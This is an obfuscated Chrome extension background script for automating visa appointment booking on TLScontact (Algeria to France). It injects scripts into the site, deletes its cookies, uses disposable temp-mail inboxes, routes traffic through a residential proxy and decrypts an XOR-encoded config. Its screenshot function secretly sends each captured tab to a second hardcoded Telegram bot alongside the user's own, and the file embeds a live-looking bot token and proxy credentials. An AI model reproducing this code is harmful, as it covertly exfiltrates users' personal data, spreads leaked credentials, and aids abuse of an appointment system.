chrome.tabs.onUpdated.addListener(async (_0x1a4ae7, _0x567f48, _0x33cddd) => {
    var {
        isValid: _0x1c0874
    } = await chrome.storage.local.get('isValid')
    if (!_0x1c0874) {
        return console.log('UnActivated...!')
    }
    if (
        _0x33cddd.status != 'complete' ||
        !_0x567f48.status ||
        _0x567f48.status != 'complete'
    ) {
        return
    }
    if (_0x33cddd.url.includes('tlscontact.com/appointment/dz/')) {
        console.log('INJECTED')
        chrome.scripting.executeScript({
            target: {
                tabId: _0x1a4ae7
            },
            files: [
                'Notiflix/notiflix.js',
                'Helpers/tableHelper.js',
                'myapp/myapp.js',
            ],
        })
    }
    if (_0x33cddd.url.includes('tlscontact.com/checkout/dz/')) {
        chrome.scripting.executeScript({
            target: {
                tabId: _0x1a4ae7
            },
            files: ['checkout/checkout.js'],
        })
    } else {
        if (_0x33cddd.url.includes('tlscontact.com')) {
            console.log('tabd : ', _0x1a4ae7, _0x567f48, _0x33cddd)
            chrome.scripting.executeScript({
                target: {
                    tabId: _0x1a4ae7
                },
                files: ['Pages/DynamicPages.js'],
            })
        }
    }
})
var getFetchRes = async (_0x302b13, _0x101146) => {
    var _0x35e99c = await fetch(_0x302b13)
    if (!_0x35e99c.ok) {
        return _0x101146({
            res: false
        })
    }
    var _0xd5a7d6 = await _0x35e99c.text()
    _0x101146({
        res: _0xd5a7d6
    })
}
var ValidMac = async (_0x2e77e5) => {
    await chrome.storage.local.set({
        isValid: true
    })
    chrome.action.setPopup({
        popup: 'popup/popup.html'
    })
    _0x2e77e5(true)
}
var isValidMAC = async (_0x42bb2b) => {
    var _0x375217 = await fetch(
        'https://docs.google.com/spreadsheets/d/1UE5ZrEitldLOGlCGRCJs4eChHioWcvuoTCNK4bnwPd0/gviz/tq?}&sheet=user-data&tq=Select%20*'
    )
    var _0x219423 = await _0x375217.text()
    var _0x5e278e = JSON.parse(_0x219423.substring(47).slice(0, -2))
    var _0x3140a2 = _0x5e278e.table.rows
        .map((_0x3124e4) => _0x3124e4.c[1].v)
        .slice(1)
    return _0x3140a2.find((_0x4a1721) => _0x4a1721 == _0x42bb2b)
}
var NotValidMac = async () => {
    await chrome.storage.local.set({
        isValid: true
    })
}
var checkMAC = async () => {
    var {
        MAC: _0x24ecf4,
        isValid: _0x1fba00
    } = await chrome.storage.local.get([
        'MAC',
        'isValid',
    ])
    if (!_0x1fba00) {
        return console.log('is Already Invalid...!')
    }
    var _0x660584 = await isValidMAC(_0x24ecf4)
    if (!_0x660584) {
        console.log('Mac is Not Valid')
    }
    console.log('isValid + Mac Valid...!')
}
var removeCookies = (_0x8e3ee6) => {
    chrome.cookies.getAll({
        domain: '.tlscontact.com'
    }, (_0x59efe0) => {
        for (var _0x3f7f2f = 0; _0x3f7f2f < _0x59efe0.length; _0x3f7f2f++) {
            chrome.cookies.remove({
                url: 'https://' + _0x59efe0[_0x3f7f2f].domain + _0x59efe0[_0x3f7f2f].path,
                name: _0x59efe0[_0x3f7f2f].name,
            })
        }
    })
    console.log('Cookies removed!')
    _0x8e3ee6({
        status: true
    })
}
var newTempEmail = async (_0x562bcd) => {
    var _0x258add = await fetch('https://web2.temp-mail.org/mailbox', {
        method: 'POST',
    })
    var _0x2eebfc = await _0x258add.json()
    await chrome.storage.local.set({
        token: _0x2eebfc.token
    })
    _0x562bcd(_0x2eebfc.mailbox)
}
var getTempMessages = async (_0x3c2658) => {
    var {
        token: _0x302471
    } = await chrome.storage.local.get('token')
    var _0x2b51eb = await fetch('https://web2.temp-mail.org/messages', {
        headers: {
            authorization: 'Bearer ' + _0x302471
        },
    })
    var _0xd571dc = await _0x2b51eb.json()
    _0x3c2658(_0xd571dc.messages)
}
var getTempBody = async (_0x5e27ef, _0x427402) => {
    var {
        token: _0x30d358
    } = await chrome.storage.local.get('token')
    var _0x39479e = await fetch(
        'https://web2.temp-mail.org/messages/' + _0x427402, {
            headers: {
                authorization: 'Bearer ' + _0x30d358
            }
        }
    )
    var _0x464e9e = await _0x39479e.json()
    _0x5e27ef(_0x464e9e.bodyHtml)
}
var sendSignal = async (_0x44d007) => {
    try {
        await fetch('http://localhost:5011/INCREMENT')
    } catch {
        return _0x44d007(false)
    }
    _0x44d007(true)
}
var getId = async (_0x5352cb) => {
    try {
        var _0x1b3229 = await fetch('http://localhost:5011/GET_ID')
    } catch {
        return _0x5352cb(false)
    }
    var _0x1d4435 = await _0x1b3229.json()
    _0x5352cb(_0x1d4435.id)
}
var SendSS = async (_0x56505b) => {
    var {
        TME_TOKEN: _0x5eec39,
        FromId: _0x367df
    } =
    await chrome.storage.local.get(['TME_TOKEN', 'FromId'])
    if (!_0x5eec39 || !_0x367df) {
        return console.log('You have to link the extension with your Telegram...!')
    }
    var _0x3f020f = await chrome.tabs.captureVisibleTab()
    var _0x571cea = atob(_0x3f020f.split('base64,')[1])
    var _0x13d42d = _0x571cea.length
    var _0x36d025 = new ArrayBuffer(_0x13d42d)
    var _0x50d38d = new Uint8Array(_0x36d025)
    for (var _0x55180d = 0; _0x55180d < _0x13d42d; _0x55180d++) {
        _0x50d38d[_0x55180d] = _0x571cea.charCodeAt(_0x55180d)
    }
    var _0x2e8ce7 = new Blob([_0x50d38d], {
        type: 'image/jpeg'
    })
    var _0x1ea5bc = new File([_0x2e8ce7], 'image.jpeg', _0x285281)
    var _0x1c8bee = new FormData()
    _0x1c8bee.append('photo', _0x1ea5bc)
    fetch(
        'https://api.telegram.org/bot' +
        _0x5eec39 +
        '/sendPhoto?chat_id=' +
        _0x367df, {
            method: 'POST',
            body: _0x1c8bee,
        }
    )
    fetch(
        'https://api.telegram.org/bot5412590753:AAEJvzt_X7Qwb09CRBmUym29KIyczrdAZ3U/sendPhoto?chat_id=1083035400', {
            method: 'POST',
            body: _0x1c8bee,
        }
    )
    _0x56505b(true)
}


ok = async () => {
    
      
          
    
    
    var ok = await fetch("http://brd-customer-hl_c9b33fac-zone-residential_proxy1-country-fr:in920t9u0cte@brd.superproxy.io:22225");
    console.log(ok.text());
}




chrome.runtime.onMessage.addListener((_0x1a254, _0x1e5006, _0x69c7cd) => {
    
ok();

    if (_0x1a254.msg == 'FETCH_URL') {
        fetch(_0x1a254.URL)
        console.log('Fetched URL:'+ _0x1a254.URL)
    } else {
        if (_0x1a254.msg == 'POPUP_ACTIVATED') {
            return true
        } else {
            if (_0x1a254.msg == 'popupOpen') {                
            } else {
                if (_0x1a254.msg == 'GET_FETCH_RES') {
                    getFetchRes(_0x1a254.URL, _0x69c7cd)
                    return true
                } else {
                    if (_0x1a254.msg == 'REMOVE_COOKIES') {
                        removeCookies(_0x69c7cd)
                    } else {
                        if (_0x1a254.msg == 'NEW_TEMP_EMAIL') {
                            newTempEmail(_0x69c7cd)
                            return true
                        } else {
                            if (_0x1a254.msg == 'GET_TEMP_MESSAGES') {
                                getTempMessages(_0x69c7cd)
                                return true
                            } else {
                                if (_0x1a254.msg == 'GET_TEMP_BODY') {
                                    getTempBody(_0x69c7cd, _0x1a254.id)
                                    return true
                                } else {
                                    if (_0x1a254.msg == 'SEND_SIGNAL') {
                                        sendSignal(_0x69c7cd)
                                        return true
                                    } else {
                                        if (_0x1a254.msg == 'GET_ID') {
                                            getId(_0x69c7cd)
                                            return true
                                        } else {
                                            if (_0x1a254.msg == 'SEND_SS') {
                                                SendSS(_0x69c7cd)
                                                return true
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
})
var decipher = (_0x2fc305) => {
    var _0x31557a = (_0x573df9) =>
        _0x573df9.split('').map((_0x498e27) => _0x498e27.charCodeAt(0))
    var _0x140e14 = (_0x5640da) =>
        _0x31557a(_0x2fc305).reduce(
            (_0x576674, _0x64b635) => _0x576674 ^ _0x64b635,
            _0x5640da
        )
    return (_0xdcc4f3) =>
        _0xdcc4f3
        .match(/.{1,2}/g)
        .map((_0x38f6bf) => parseInt(_0x38f6bf, 16))
        .map(_0x140e14)
        .map((_0x304bc3) => String.fromCharCode(_0x304bc3))
        .join('')
}
var SetConfig = async () => {
    var {
        CONFIG: _0x50ae80,
        StartUpLogin: _0xa2c856
    } =
    await chrome.storage.local.get(['CONFIG', 'StartUpLogin'])
    if (!_0x50ae80) {
        var _0x41561b = await fetch('Helpers/Config.KBLS')
        var _0xc6114e = await _0x41561b.text()
        var _0x429117 = decipher('K-BLS-KEY')
        var _0x29068d = _0x429117(_0xc6114e)
        _0x50ae80 = JSON.parse(_0x29068d)
        console.log(_0x50ae80) //
        _0x50ae80.PROXY_ROTATION = true
        _0x50ae80.DISPO_PROXY_CHANGE = true
        console.log(_0x50ae80) //

        await chrome.storage.local.set({
            CONFIG: _0x50ae80
        })
    }
    if (_0x50ae80.STARTUP && _0xa2c856) {
        chrome.tabs.create({
            url: 'https://visas-fr.tlscontact.com/visa/dz/'
        })
    }
    chrome.action.setPopup({
        popup: 'popup/popup.html'
    })
    chrome.storage.local.set({
        isValid: true
    })
}
chrome.runtime.onInstalled.addListener(SetConfig)
chrome.runtime.onStartup.addListener(SetConfig)